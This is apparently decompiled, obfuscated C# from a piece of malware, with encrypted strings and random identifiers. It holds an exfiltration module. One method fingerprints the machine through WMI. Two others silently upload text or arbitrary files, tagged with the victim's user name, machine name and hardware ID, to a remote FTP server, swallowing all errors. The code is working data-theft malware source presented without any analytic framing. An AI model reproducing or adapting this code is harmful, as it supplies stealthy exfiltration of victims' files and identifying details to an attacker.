using System;
using System.IO;
using System.Management;
using System.Net;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace wDtIYaxdpawEu;

internal sealed class orMQkbNvmzZPsHt
{
	[NonSerialized]
	internal static GetString getString_0;

	public static string XWqsewBKiLfR()
	{
		//IL_0015: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_003a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0040: Expected O, but got Unknown
		//IL_00a9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b0: Expected O, but got Unknown
		string text = string.Empty;
		try
		{
			ManagementClass val = new ManagementClass(getString_0(107380498));
			ManagementObjectCollection instances = val.GetInstances();
			ManagementObjectEnumerator enumerator = instances.GetEnumerator();
			try
			{
				if (enumerator.MoveNext())
				{
					ManagementObject val2 = (ManagementObject)enumerator.get_Current();
					text = ((ManagementBaseObject)val2).get_Properties().get_Item(getString_0(107380477)).get_Value()
						.ToString();
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			string text2 = getString_0(107380492);
			ManagementObject val3 = new ManagementObject(getString_0(107380487) + text2 + getString_0(107380926));
			val3.Get();
			return ((ManagementBaseObject)val3).get_Item(getString_0(107380921)).ToString();
		}
		catch (Exception)
		{
			return string.IsNullOrEmpty(text) ? getString_0(107401649) : text;
		}
	}

	public static void jOkjdnrkUHMWfl(string gTPzbCizXMhVxT = "URL", string ylkCoDSUiweTPIKS = "USERNAME", string gwUFnPRnZuVD = "ACCESO", string cjeOOJjwPUy = "")
	{
		try
		{
			string text = XWqsewBKiLfR();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(gTPzbCizXMhVxT + getString_0(107349301) + Environment.UserName + getString_0(107349320) + Environment.MachineName + getString_0(107349267) + text + getString_0(107349294));
			ftpWebRequest.Method = getString_0(107380896);
			ftpWebRequest.Credentials = new NetworkCredential(ylkCoDSUiweTPIKS, gwUFnPRnZuVD);
			ASCIIEncoding aSCIIEncoding = new ASCIIEncoding();
			byte[] bytes = aSCIIEncoding.GetBytes(cjeOOJjwPUy);
			ftpWebRequest.ContentLength = bytes.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(bytes, 0, bytes.Length);
		}
		catch
		{
		}
	}

	public static void pBYlYRXdmUuSS(string dyXrKYtxOjJi = "URL", string nSIVfxFVjkBUb = "USERNAME", string cnQgtTPEoArjedC = "ACCESO", string tYRjWgnasSFowNSk = "")
	{
		try
		{
			string text = XWqsewBKiLfR();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(dyXrKYtxOjJi + getString_0(107349301) + Environment.UserName + getString_0(107349320) + Environment.MachineName + getString_0(107349267) + text + getString_0(107349267) + Path.GetFileName(tYRjWgnasSFowNSk));
			ftpWebRequest.Method = getString_0(107380896);
			ftpWebRequest.Credentials = new NetworkCredential(nSIVfxFVjkBUb, cnQgtTPEoArjedC);
			byte[] array = File.ReadAllBytes(tYRjWgnasSFowNSk);
			ftpWebRequest.ContentLength = array.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(array, 0, array.Length);
		}
		catch
		{
		}
	}

	static orMQkbNvmzZPsHt()
	{
		Strings.CreateGetStringDelegate(typeof(orMQkbNvmzZPsHt));
	}
}
